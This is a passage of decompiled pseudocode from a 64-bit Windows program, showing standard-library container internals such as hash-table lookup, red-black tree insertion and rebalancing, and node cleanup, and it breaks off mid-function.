__int64 __fastcall sub_14001EBA0(__int64 a1, __int64 a2, unsigned __int64 *a3, __int64 **a4)
{
  __int64 **v4; // rdi
  unsigned __int64 *v5; // r12
  __int64 v6; // r14
  __int64 v7; // r13
  unsigned __int64 v8; // r15
  unsigned __int64 v9; // r10
  unsigned __int64 v10; // r9
  unsigned __int64 v11; // rsi
  unsigned __int64 v12; // rcx
  unsigned __int64 v13; // rcx
  unsigned __int64 v14; // rsi
  __int64 *v15; // rbx
  __int64 v16; // r9
  signed __int64 v17; // r8
  __int64 *v18; // rax
  signed __int64 v19; // rsi
  _QWORD *v20; // rdx
  unsigned __int64 v21; // r14
  const void *v22; // rcx
  size_t v23; // r8
  signed int v24; // eax
  __int64 *v25; // rax
  __int64 *v26; // rdx
  __int64 ***v27; // rdx
  __int64 ***v28; // rax
  __int64 **v29; // rcx
  __int64 v31; // [rsp+78h] [rbp+10h]
  signed __int64 v32; // [rsp+80h] [rbp+18h]

  v31 = a2;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = a3[2];
  v9 = a3[3];
  if ( v9 < 0x10 )
    v10 = (unsigned __int64)a3;
  else
    v10 = *a3;
  v11 = -3750763034362895579i64;
  v12 = 0i64;
  if ( v8 )
  {
    do
      v11 = 1099511628211i64 * (*(unsigned __int8 *)(v12++ + v10) ^ v11);
    while ( v12 < v8 );
  }
  v13 = *(_QWORD *)(v7 + 40);
  v14 = v13 & ((v11 >> 32) ^ v11);
  if ( *(_QWORD *)(v7 + 48) <= v14 )
    v14 += -1i64 - (v13 >> 1);
  v15 = *(__int64 **)v7;
  v16 = *(_QWORD *)(v7 + 16);
  v17 = 16 * v14;
  v32 = 16 * v14;
  v18 = *(__int64 **)(16 * v14 + v16);
  if ( *(__int64 **)v7 != v18 )
  {
    v15 = **(__int64 ***)(v17 + v16 + 8);
    if ( v15 != v18 )
    {
      v19 = 2 * v14;
      while ( 1 )
      {
        v15 = (__int64 *)v15[1];
        v20 = v15 + 2;
        v21 = v15[4];
        if ( (unsigned __int64)v15[5] >= 0x10 )
          v20 = (_QWORD *)*v20;
        if ( v9 < 0x10 )
          v22 = v5;
        else
          v22 = (const void *)*v5;
        v23 = v15[4];
        if ( v8 < v21 )
          v23 = v8;
        if ( v23 )
        {
          v24 = memcmp(v22, v20, v23);
          v16 = *(_QWORD *)(v7 + 16);
          v9 = v5[3];
        }
        else
        {
          v24 = 0;
        }
        if ( !v24 )
        {
          if ( v8 >= v21 )
            v24 = v8 != v21;
          else
            v24 = -1;
        }
        if ( !v24 )
          break;
        if ( v15 == *(__int64 **)(v16 + 8 * v19) )
          goto LABEL_29;
      }
      v15 = (__int64 *)*v15;
LABEL_29:
      v6 = v31;
      v17 = v32;
    }
  }
  v25 = *v4;
  if ( v15 != *v4 )
  {
    *v4[1] = (__int64)v25;
    *(_QWORD *)v25[1] = v15;
    *(_QWORD *)v15[1] = v4;
    v26 = (__int64 *)v15[1];
    v15[1] = v25[1];
    v25[1] = (__int64)v4[1];
    v4[1] = v26;
  }
  v27 = (__int64 ***)(v17 + *(_QWORD *)(v7 + 16));
  if ( *v27 == *(__int64 ***)v7 )
  {
    *v27 = v4;
    *(_QWORD *)(v17 + *(_QWORD *)(v7 + 16) + 8) = v4;
  }
  else if ( *v27 == (__int64 **)v15 )
  {
    *v27 = v4;
  }
  else
  {
    v28 = (__int64 ***)v27[1];
    v29 = *v28;
    v27[1] = *v28;
    if ( v29 != v4 )
      *(_QWORD *)(*(_QWORD *)(v7 + 16) + v17 + 8) = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v7 + 16) + v17 + 8) + 8i64);
  }
  sub_140021740((__int64 **)v7);
  *(_QWORD *)v6 = v4;
  *(_BYTE *)(v6 + 8) = 1;
  return v6;
}

//----- (000000014001EDA0) ----------------------------------------------------
__int64 *__fastcall sub_14001EDA0(__int64 a1, __int64 *a2, char a3, __int64 *a4, __int64 a5, __int64 a6)
{
  unsigned __int64 v6; // rax
  _QWORD *v7; // r10
  __int64 *v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 *v11; // rcx
  __int64 *v12; // r8
  __int64 *v13; // rdx
  __int64 v14; // rdx
  __int64 *v15; // rdx
  __int64 **v16; // rcx
  _QWORD *v17; // rdx
  _QWORD *v18; // r8
  __int64 v19; // rcx
  _QWORD *v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rcx
  __int64 v25; // rax
  __int64 v26; // rcx
  __int64 *result; // rax

  v6 = *(_QWORD *)(a1 + 8);
  v7 = (_QWORD *)a1;
  v8 = a2;
  if ( v6 >= 0x333333333333332i64 )
  {
    sub_140021870(a1, a6);
    std::_Xlength_error("map/set<T> too long");
    __debugbreak();
  }
  v7[1] = v6 + 1;
  *(_QWORD *)(a6 + 8) = a4;
  if ( a4 == (__int64 *)*v7 )
  {
    *(_QWORD *)(*v7 + 8i64) = a6;
    *(_QWORD *)*v7 = a6;
    v9 = *v7;
LABEL_9:
    *(_QWORD *)(v9 + 16) = a6;
    goto LABEL_10;
  }
  if ( !a3 )
  {
    a4[2] = a6;
    v9 = *v7;
    if ( a4 != *(__int64 **)(*v7 + 16i64) )
      goto LABEL_10;
    goto LABEL_9;
  }
  *a4 = a6;
  if ( a4 == *(__int64 **)*v7 )
    *(_QWORD *)*v7 = a6;
LABEL_10:
  v10 = a6;
  while ( !*(_BYTE *)(*(_QWORD *)(v10 + 8) + 24i64) )
  {
    v11 = *(__int64 **)(v10 + 8);
    v12 = (__int64 *)v11[1];
    v13 = (__int64 *)*v12;
    if ( v11 == (__int64 *)*v12 )
    {
      v14 = v12[2];
      if ( *(_BYTE *)(v14 + 24) )
      {
        if ( v10 == v11[2] )
        {
          v15 = (__int64 *)v11[2];
          v10 = *(_QWORD *)(v10 + 8);
          v11[2] = *v15;
          if ( !*(_BYTE *)(*v15 + 25) )
            *(_QWORD *)(*v15 + 8) = v11;
          v15[1] = v11[1];
          if ( v11 == *(__int64 **)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v15;
          }
          else
          {
            v16 = (__int64 **)v11[1];
            if ( (__int64 *)v10 == *v16 )
              *v16 = v15;
            else
              v16[2] = v15;
          }
          *v15 = v10;
          *(_QWORD *)(v10 + 8) = v15;
        }
        *(_BYTE *)(*(_QWORD *)(v10 + 8) + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(*(_QWORD *)(v10 + 8) + 8i64);
        v18 = (_QWORD *)*v17;
        *v17 = *(_QWORD *)(*v17 + 16i64);
        v19 = v18[2];
        if ( !*(_BYTE *)(v19 + 25) )
          *(_QWORD *)(v19 + 8) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
          v18[2] = v17;
        }
        else
        {
          v20 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)v20[2] )
            v20[2] = v18;
          else
            *v20 = v18;
          v18[2] = v17;
        }
LABEL_50:
        v17[1] = v18;
        continue;
      }
      *((_BYTE *)v11 + 24) = 1;
      *(_BYTE *)(v14 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) + 24i64) = 0;
      v10 = *(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64);
    }
    else
    {
      if ( *((_BYTE *)v13 + 24) )
      {
        if ( v10 == *v11 )
        {
          v21 = *v11;
          v10 = *(_QWORD *)(v10 + 8);
          *v11 = *(_QWORD *)(*v11 + 16);
          v22 = *(_QWORD *)(v21 + 16);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v10;
          *(_QWORD *)(v21 + 8) = *(_QWORD *)(v10 + 8);
          if ( v10 == *(_QWORD *)(*v7 + 8i64) )
          {
            *(_QWORD *)(*v7 + 8i64) = v21;
          }
          else
          {
            v23 = *(_QWORD **)(v10 + 8);
            if ( v10 == v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *(_QWORD *)(v21 + 16) = v10;
          *(_QWORD *)(v10 + 8) = v21;
        }
        *(_BYTE *)(*(_QWORD *)(v10 + 8) + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(*(_QWORD *)(v10 + 8) + 8i64);
        v18 = (_QWORD *)v17[2];
        v17[2] = *v18;
        if ( !*(_BYTE *)(*v18 + 25i64) )
          *(_QWORD *)(*v18 + 8i64) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v7 + 8i64) )
        {
          *(_QWORD *)(*v7 + 8i64) = v18;
        }
        else
        {
          v24 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)*v24 )
            *v24 = v18;
          else
            v24[2] = v18;
        }
        *v18 = v17;
        goto LABEL_50;
      }
      *((_BYTE *)v11 + 24) = 1;
      *((_BYTE *)v13 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64) + 24i64) = 0;
      v10 = *(_QWORD *)(*(_QWORD *)(v10 + 8) + 8i64);
    }
  }
  v25 = *v7;
  *v8 = a6;
  v26 = *(_QWORD *)(v25 + 8);
  result = v8;
  *(_BYTE *)(v26 + 24) = 1;
  return result;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014001F050) ----------------------------------------------------
_QWORD *__fastcall sub_14001F050(_QWORD *a1, _QWORD *a2, char a3, _QWORD *a4, _QWORD *a5)
{
  _QWORD *v5; // rdi
  char v6; // si
  _QWORD *v7; // r14
  _QWORD *v8; // rbx
  _QWORD *v9; // rax
  _QWORD *v10; // r9
  __int64 *v11; // rcx
  __int64 *v12; // r8
  __int64 *v13; // rdx
  __int64 v14; // rdx
  _QWORD *v15; // rdx
  _QWORD *v16; // rcx
  _QWORD *v17; // rdx
  _QWORD *v18; // r8
  __int64 v19; // rcx
  _QWORD *v20; // rcx
  __int64 v21; // rdx
  __int64 v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rcx
  __int64 v25; // rcx

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( a1[1] >= 0x3FFFFFFFFFFFFFEui64 )
  {
    std::_Xlength_error("map/set<T> too long");
    __debugbreak();
  }
  v9 = sub_14001EAE0(a1, a5);
  ++v8[1];
  v9[1] = v5;
  v10 = v9;
  if ( v5 == (_QWORD *)*v8 )
  {
    *(_QWORD *)(*v8 + 8i64) = v9;
    *(_QWORD *)*v8 = v9;
    *(_QWORD *)(*v8 + 16i64) = v9;
  }
  else if ( v6 )
  {
    *v5 = v9;
    if ( v5 == *(_QWORD **)*v8 )
      *(_QWORD *)*v8 = v9;
  }
  else
  {
    v5[2] = v9;
    if ( v5 == *(_QWORD **)(*v8 + 16i64) )
      *(_QWORD *)(*v8 + 16i64) = v9;
  }
  while ( !*(_BYTE *)(v9[1] + 24i64) )
  {
    v11 = (__int64 *)v9[1];
    v12 = (__int64 *)v11[1];
    v13 = (__int64 *)*v12;
    if ( v11 == (__int64 *)*v12 )
    {
      v14 = v12[2];
      if ( *(_BYTE *)(v14 + 24) )
      {
        if ( v9 == (_QWORD *)v11[2] )
        {
          v15 = (_QWORD *)v11[2];
          v9 = (_QWORD *)v9[1];
          v11[2] = *v15;
          if ( !*(_BYTE *)(*v15 + 25i64) )
            *(_QWORD *)(*v15 + 8i64) = v11;
          v15[1] = v11[1];
          if ( v11 == *(__int64 **)(*v8 + 8i64) )
          {
            *(_QWORD *)(*v8 + 8i64) = v15;
          }
          else
          {
            v16 = (_QWORD *)v11[1];
            if ( v9 == (_QWORD *)*v16 )
              *v16 = v15;
            else
              v16[2] = v15;
          }
          *v15 = v9;
          v9[1] = v15;
        }
        *(_BYTE *)(v9[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v9[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v9[1] + 8i64);
        v18 = (_QWORD *)*v17;
        *v17 = *(_QWORD *)(*v17 + 16i64);
        v19 = v18[2];
        if ( !*(_BYTE *)(v19 + 25) )
          *(_QWORD *)(v19 + 8) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v8 + 8i64) )
        {
          *(_QWORD *)(*v8 + 8i64) = v18;
          v18[2] = v17;
        }
        else
        {
          v20 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)v20[2] )
            v20[2] = v18;
          else
            *v20 = v18;
          v18[2] = v17;
        }
LABEL_50:
        v17[1] = v18;
        continue;
      }
      *((_BYTE *)v11 + 24) = 1;
      *(_BYTE *)(v14 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v9[1] + 8i64) + 24i64) = 0;
      v9 = *(_QWORD **)(v9[1] + 8i64);
    }
    else
    {
      if ( *((_BYTE *)v13 + 24) )
      {
        if ( v9 == (_QWORD *)*v11 )
        {
          v21 = *v11;
          v9 = (_QWORD *)v9[1];
          *v11 = *(_QWORD *)(*v11 + 16);
          v22 = *(_QWORD *)(v21 + 16);
          if ( !*(_BYTE *)(v22 + 25) )
            *(_QWORD *)(v22 + 8) = v9;
          *(_QWORD *)(v21 + 8) = v9[1];
          if ( v9 == *(_QWORD **)(*v8 + 8i64) )
          {
            *(_QWORD *)(*v8 + 8i64) = v21;
          }
          else
          {
            v23 = (_QWORD *)v9[1];
            if ( v9 == (_QWORD *)v23[2] )
              v23[2] = v21;
            else
              *v23 = v21;
          }
          *(_QWORD *)(v21 + 16) = v9;
          v9[1] = v21;
        }
        *(_BYTE *)(v9[1] + 24i64) = 1;
        *(_BYTE *)(*(_QWORD *)(v9[1] + 8i64) + 24i64) = 0;
        v17 = *(_QWORD **)(v9[1] + 8i64);
        v18 = (_QWORD *)v17[2];
        v17[2] = *v18;
        if ( !*(_BYTE *)(*v18 + 25i64) )
          *(_QWORD *)(*v18 + 8i64) = v17;
        v18[1] = v17[1];
        if ( v17 == *(_QWORD **)(*v8 + 8i64) )
        {
          *(_QWORD *)(*v8 + 8i64) = v18;
        }
        else
        {
          v24 = (_QWORD *)v17[1];
          if ( v17 == (_QWORD *)*v24 )
            *v24 = v18;
          else
            v24[2] = v18;
        }
        *v18 = v17;
        goto LABEL_50;
      }
      *((_BYTE *)v11 + 24) = 1;
      *((_BYTE *)v13 + 24) = 1;
      *(_BYTE *)(*(_QWORD *)(v9[1] + 8i64) + 24i64) = 0;
      v9 = *(_QWORD **)(v9[1] + 8i64);
    }
  }
  v25 = *(_QWORD *)(*v8 + 8i64);
  *v7 = v10;
  *(_BYTE *)(v25 + 24) = 1;
  return v7;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014001F320) ----------------------------------------------------
__int64 *__fastcall sub_14001F320(__int64 a1, __int64 *a2, __int64 *a3, const void **a4, __int64 a5)
{
  const void **v5; // r14
  __int64 *v6; // rdi
  __int64 **v7; // rsi
  __int64 *v9; // rax
  __int64 *v10; // rax
  __int64 *v11; // rbx
  __int64 j; // rax
  __int64 i; // rcx
  __int64 *v14; // r9
  __int64 *v15; // rbx
  __int64 v16; // rax
  __int64 l; // rax
  __int64 k; // rax
  char v19; // [rsp+38h] [rbp-30h]
  __int64 *v20; // [rsp+80h] [rbp+18h]

  v20 = a3;
  v5 = a4;
  v6 = a2;
  v7 = (__int64 **)a1;
  if ( !*(_QWORD *)(a1 + 8) )
  {
    sub_14001EDA0(a1, a2, 1, *(__int64 **)a1, (__int64)a4, a5);
    return v6;
  }
  v9 = *(__int64 **)a1;
  if ( a3 == **(__int64 ***)a1 )
  {
    if ( (signed int)sub_14000B9E0(a4, a3 + 4) < 0 )
    {
      sub_14001EDA0((__int64)v7, v6, 1, v20, (__int64)v5, a5);
      return v6;
    }
    goto LABEL_43;
  }
  if ( a3 == v9 )
  {
    if ( (signed int)sub_14000B9E0((_QWORD *)(v9[2] + 32), a4) < 0 )
    {
      sub_14001EDA0((__int64)v7, v6, 0, (__int64 *)(*v7)[2], (__int64)v5, a5);
      return v6;
    }
    goto LABEL_43;
  }
  if ( (signed int)sub_14000B9E0(a4, a3 + 4) < 0 )
  {
    v10 = v20;
    if ( *((_BYTE *)v20 + 25) )
    {
      v11 = (__int64 *)v20[2];
    }
    else
    {
      v11 = (__int64 *)*v20;
      if ( *(_BYTE *)(*v20 + 25) )
      {
        for ( i = v20[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
        {
          if ( v10 != *(__int64 **)i )
            break;
          v10 = (__int64 *)i;
        }
        v11 = v10;
        if ( !*((_BYTE *)v10 + 25) )
          v11 = (__int64 *)i;
      }
      else
      {
        for ( j = v11[2]; !*(_BYTE *)(j + 25); j = *(_QWORD *)(j + 16) )
          v11 = (__int64 *)j;
      }
    }
    if ( (signed int)sub_14000B9E0(v11 + 4, v5) < 0 )
    {
      if ( *(_BYTE *)(v11[2] + 25) )
        sub_14001EDA0((__int64)v7, v6, 0, v11, (__int64)v5, a5);
      else
        sub_14001EDA0((__int64)v7, v6, 1, v20, (__int64)v5, a5);
      return v6;
    }
  }
  if ( (signed int)sub_14000B9E0(v20 + 4, v5) >= 0 )
    goto LABEL_43;
  v14 = v20;
  v15 = v20;
  if ( !*((_BYTE *)v20 + 25) )
  {
    v16 = v20[2];
    if ( *(_BYTE *)(v16 + 25) )
    {
      for ( k = v20[1]; !*(_BYTE *)(k + 25); k = *(_QWORD *)(k + 8) )
      {
        if ( v15 != *(__int64 **)(k + 16) )
          break;
        v15 = (__int64 *)k;
      }
      v15 = (__int64 *)k;
    }
    else
    {
      v15 = (__int64 *)v20[2];
      for ( l = *(_QWORD *)v16; !*(_BYTE *)(l + 25); l = *(_QWORD *)l )
        v15 = (__int64 *)l;
    }
  }
  if ( v15 == *v7 )
    goto LABEL_39;
  if ( (signed int)sub_14000B9E0(v5, v15 + 4) >= 0 )
  {
LABEL_43:
    *v6 = *(_QWORD *)sub_14001F600(v7, (__int64)&v19, 0, v5, a5);
    return v6;
  }
  v14 = v20;
LABEL_39:
  if ( *(_BYTE *)(v14[2] + 25) )
    sub_14001EDA0((__int64)v7, v6, 0, v14, (__int64)v5, a5);
  else
    sub_14001EDA0((__int64)v7, v6, 1, v15, (__int64)v5, a5);
  return v6;
}

//----- (000000014001F600) ----------------------------------------------------
__int64 __fastcall sub_14001F600(_QWORD **a1, __int64 a2, char a3, const void **a4, __int64 a5)
{
  const void **v5; // r14
  char v6; // al
  __int64 v7; // r12
  _QWORD **v8; // rsi
  _QWORD *v9; // rcx
  __int64 *v10; // rbx
  __int64 *v11; // r15
  bool v12; // di
  const void *v13; // r13
  _QWORD *v14; // rcx
  const void *v15; // rsi
  const void *v16; // rdx
  unsigned __int64 v17; // rdi
  size_t v18; // r8
  signed int v19; // eax
  _QWORD *v20; // rdx
  const void *v21; // rsi
  const void *v22; // rdi
  const void *v23; // rcx
  size_t v24; // r8
  signed int v25; // eax
  __int64 v26; // rbx
  __int64 j; // rax
  __int64 i; // rax
  _QWORD *v30; // [rsp+30h] [rbp-38h]
  __int64 v31; // [rsp+38h] [rbp-30h]
  _QWORD **v32; // [rsp+70h] [rbp+8h]
  char v33; // [rsp+80h] [rbp+18h]

  v33 = a3;
  v32 = a1;
  v31 = -2i64;
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  v9 = *a1;
  v30 = v9;
  v10 = (__int64 *)v9[1];
  v11 = v9;
  v12 = 1;
  if ( !*((_BYTE *)v10 + 25) )
  {
    v13 = a4[3];
    do
    {
      v11 = v10;
      if ( v6 )
      {
        v14 = v10 + 4;
        v15 = v5[2];
        if ( (unsigned __int64)v13 < 0x10 )
          v16 = v5;
        else
          v16 = *v5;
        v17 = v10[6];
        if ( (unsigned __int64)v10[7] >= 0x10 )
          v14 = (_QWORD *)*v14;
        v18 = (size_t)v5[2];
        if ( v17 < (unsigned __int64)v15 )
          v18 = v10[6];
        if ( v18 )
          v19 = memcmp(v14, v16, v18);
        else
          v19 = 0;
        if ( !v19 )
        {
          if ( v17 >= (unsigned __int64)v15 )
            v19 = v17 != (_QWORD)v15;
          else
            v19 = -1;
        }
        v12 = v19 >= 0;
      }
      else
      {
        v20 = v10 + 4;
        v21 = (const void *)v10[6];
        if ( (unsigned __int64)v10[7] >= 0x10 )
          v20 = (_QWORD *)*v20;
        v22 = v5[2];
        if ( (unsigned __int64)v13 < 0x10 )
          v23 = v5;
        else
          v23 = *v5;
        v24 = v10[6];
        if ( v22 < v21 )
          v24 = (size_t)v5[2];
        if ( v24 )
          v25 = memcmp(v23, v20, v24);
        else
          v25 = 0;
        if ( !v25 )
        {
          if ( v22 >= v21 )
            v25 = v22 != v21;
          else
            v25 = -1;
        }
        v12 = v25 < 0;
      }
      if ( v12 )
        v10 = (__int64 *)*v10;
      else
        v10 = (__int64 *)v10[2];
      v6 = v33;
    }
    while ( !*((_BYTE *)v10 + 25) );
    v8 = v32;
    v9 = v30;
  }
  v26 = (__int64)v11;
  if ( v12 )
  {
    if ( v11 == (__int64 *)*v9 )
    {
      *(_QWORD *)v7 = *sub_14001EDA0((__int64)v8, (__int64 *)&v30, 1, v11, (__int64)v5, a5);
      *(_BYTE *)(v7 + 8) = 1;
      return v7;
    }
    if ( *((_BYTE *)v11 + 25) )
    {
      v26 = v11[2];
    }
    else if ( *(_BYTE *)(*v11 + 25) )
    {
      for ( i = v11[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( v26 != *(_QWORD *)i )
          break;
        v26 = i;
      }
      if ( !*(_BYTE *)(v26 + 25) )
        v26 = i;
    }
    else
    {
      v26 = *v11;
      for ( j = *(_QWORD *)(*v11 + 16); !*(_BYTE *)(j + 25); j = *(_QWORD *)(j + 16) )
        v26 = j;
    }
  }
  if ( (signed int)sub_14000B9E0((_QWORD *)(v26 + 32), v5) >= 0 )
  {
    sub_140021870((__int64)v8, a5);
    *(_QWORD *)v7 = v26;
    *(_BYTE *)(v7 + 8) = 0;
  }
  else
  {
    *(_QWORD *)v7 = *sub_14001EDA0((__int64)v8, (__int64 *)&v30, v12, v11, (__int64)v5, a5);
    *(_BYTE *)(v7 + 8) = 1;
  }
  return v7;
}

//----- (000000014001F870) ----------------------------------------------------
__int64 __fastcall sub_14001F870(_QWORD **a1, __int64 a2, char a3, const void **a4)
{
  const void **v4; // r14
  char v5; // al
  __int64 v6; // r12
  _QWORD *v7; // rsi
  _QWORD *v8; // rcx
  __int64 *v9; // rbx
  _QWORD *v10; // r15
  bool v11; // di
  size_t v12; // rsi
  unsigned __int64 v13; // r13
  _QWORD *v14; // rcx
  const void *v15; // rdx
  size_t v16; // rdi
  size_t v17; // r8
  signed int v18; // eax
  _QWORD *v19; // rdx
  size_t v20; // rdi
  const void *v21; // rcx
  size_t v22; // r8
  signed int v23; // eax
  _QWORD *v24; // rbx
  __int64 j; // rax
  __int64 i; // rax
  _QWORD *v28; // [rsp+30h] [rbp-38h]
  _QWORD *v29; // [rsp+70h] [rbp+8h]
  char v30; // [rsp+80h] [rbp+18h]

  v30 = a3;
  v29 = a1;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = *a1;
  v28 = v8;
  v9 = (__int64 *)v8[1];
  v10 = v8;
  v11 = 1;
  if ( !*((_BYTE *)v9 + 25) )
  {
    v12 = (size_t)a4[2];
    v13 = (unsigned __int64)a4[3];
    do
    {
      v10 = v9;
      if ( v5 )
      {
        v14 = v9 + 4;
        if ( v13 < 0x10 )
          v15 = v4;
        else
          v15 = *v4;
        v16 = v9[6];
        if ( (unsigned __int64)v9[7] >= 0x10 )
          v14 = (_QWORD *)*v14;
        v17 = v12;
        if ( v16 < v12 )
          v17 = v9[6];
        if ( v17 )
          v18 = memcmp(v14, v15, v17);
        else
          v18 = 0;
        if ( !v18 )
        {
          if ( v16 >= v12 )
            v18 = v16 != v12;
          else
            v18 = -1;
        }
        v11 = v18 >= 0;
      }
      else
      {
        v19 = v9 + 4;
        v20 = v9[6];
        if ( (unsigned __int64)v9[7] >= 0x10 )
          v19 = (_QWORD *)*v19;
        if ( v13 < 0x10 )
          v21 = v4;
        else
          v21 = *v4;
        v22 = v9[6];
        if ( v12 < v20 )
          v22 = v12;
        if ( v22 )
          v23 = memcmp(v21, v19, v22);
        else
          v23 = 0;
        if ( !v23 )
        {
          if ( v12 >= v20 )
            v23 = v12 != v20;
          else
            v23 = -1;
        }
        v11 = v23 < 0;
      }
      if ( v11 )
        v9 = (__int64 *)*v9;
      else
        v9 = (__int64 *)v9[2];
      v5 = v30;
    }
    while ( !*((_BYTE *)v9 + 25) );
    v8 = v28;
    v7 = v29;
  }
  v24 = v10;
  if ( v11 )
  {
    if ( v10 == (_QWORD *)*v8 )
    {
      *(_QWORD *)v6 = *sub_14001F050(v7, &v29, 1, v10, v4);
      *(_BYTE *)(v6 + 8) = 1;
      return v6;
    }
    if ( *((_BYTE *)v10 + 25) )
    {
      v24 = (_QWORD *)v10[2];
    }
    else if ( *(_BYTE *)(*v10 + 25i64) )
    {
      for ( i = v10[1]; !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( v24 != *(_QWORD **)i )
          break;
        v24 = (_QWORD *)i;
      }
      if ( !*((_BYTE *)v24 + 25) )
        v24 = (_QWORD *)i;
    }
    else
    {
      v24 = (_QWORD *)*v10;
      for ( j = *(_QWORD *)(*v10 + 16i64); !*(_BYTE *)(j + 25); j = *(_QWORD *)(j + 16) )
        v24 = (_QWORD *)j;
    }
  }
  if ( (signed int)sub_14000B9E0(v24 + 4, v4) >= 0 )
  {
    *(_QWORD *)v6 = v24;
    *(_BYTE *)(v6 + 8) = 0;
  }
  else
  {
    *(_QWORD *)v6 = *sub_14001F050(v7, &v29, v11, v10, v4);
    *(_BYTE *)(v6 + 8) = 1;
  }
  return v6;
}

//----- (000000014001FAD0) ----------------------------------------------------
__int64 __fastcall sub_14001FAD0(__int64 *a1, __int64 a2, __int64 *a3)
{
  __int64 result; // rax

  for ( ; a2; --a2 )
  {
    if ( a1 )
    {
      result = *a3;
      *a1 = *a3;
    }
    ++a1;
  }
  return result;
}

//----- (000000014001FB00) ----------------------------------------------------
_QWORD *__fastcall sub_14001FB00(unsigned __int64 a1, unsigned __int64 a2, _QWORD *a3)
{
  __int64 v3; // r9
  unsigned __int64 v4; // r10
  unsigned __int64 v5; // rcx

  v3 = 0i64;
  v4 = (a2 - a1 + 7) >> 3;
  if ( a1 > a2 )
    v4 = 0i64;
  if ( v4 )
  {
    v5 = a1 - (_QWORD)a3;
    do
    {
      if ( a3 )
        *a3 = *(_QWORD *)((char *)a3 + v5);
      ++a3;
      ++v3;
    }
    while ( v3 != v4 );
  }
  return a3;
}

//----- (000000014001FB50) ----------------------------------------------------
_QWORD *__fastcall sub_14001FB50(_QWORD *a1, _QWORD *a2, __int64 a3)
{
  __int64 v3; // rdi
  _QWORD *v4; // rbx
  __int64 v5; // rax
  signed __int64 v6; // rcx
  _QWORD *v8; // [rsp+50h] [rbp+18h]

  v3 = a3;
  v4 = a1;
  a1[3] = 15i64;
  a1[2] = 0i64;
  *(_BYTE *)a1 = 0;
  sub_140004DF0(a1, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v8 = v4 + 4;
  *v8 = *(_QWORD *)v3;
  v5 = *(_QWORD *)(v3 + 8);
  v8[1] = v5;
  if ( v5 )
    _InterlockedIncrement((volatile signed __int32 *)(v5 + 8));
  *((_BYTE *)v4 + 48) = *(_BYTE *)(v3 + 16);
  v6 = (signed __int64)(v4 + 7);
  *(_QWORD *)(v6 + 24) = 15i64;
  *(_QWORD *)(v6 + 16) = 0i64;
  *(_BYTE *)v6 = 0;
  sub_140004DF0(v4 + 7, (_QWORD *)(v3 + 24), 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v4;
}

//----- (000000014001FC00) ----------------------------------------------------
_QWORD *__fastcall sub_14001FC00(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rcx
  unsigned __int64 v3; // r8
  __int64 v5; // [rsp+58h] [rbp+10h]
  char v6; // [rsp+60h] [rbp+18h]

  v1 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  *a1 = sub_140021620(a1, 0i64, 0i64);
  v2 = v1 + 2;
  *v2 = 0i64;
  v2[1] = 0i64;
  v2[2] = 0i64;
  *((_DWORD *)v1 + 14) = 1065353216;
  v5 = *v1;
  v3 = v1[2];
  v1[3] = v1[2];
  sub_140021980(v1 + 2, &v6, v3, 0x10ui64, &v5);
  v1[5] = 7i64;
  v1[6] = 8i64;
  return v1;
}
// 140021620: using guessed type __int64 __fastcall sub_140021620(_QWORD, _QWORD, _QWORD);

//----- (000000014001FD70) ----------------------------------------------------
void __fastcall sub_14001FD70(void **a1)
{
  void **v1; // rsi
  _QWORD *v2; // rbx
  _QWORD *v3; // rdi

  v1 = a1;
  v2 = *(_QWORD **)*a1;
  *(_QWORD *)*a1 = *a1;
  *((_QWORD *)*a1 + 1) = *a1;
  a1[1] = 0i64;
  if ( v2 != *a1 )
  {
    do
    {
      v3 = (_QWORD *)*v2;
      sub_14001FDE0((__int64)(v2 + 2));
      operator delete(v2);
      v2 = v3;
    }
    while ( v3 != *v1 );
  }
  operator delete(*v1);
}

//----- (000000014001FDE0) ----------------------------------------------------
void __fastcall sub_14001FDE0(__int64 a1)
{
  __int64 v1; // rbx
  volatile signed __int32 *v2; // rdi

  v1 = a1;
  if ( *(_QWORD *)(a1 + 80) >= 0x10ui64 )
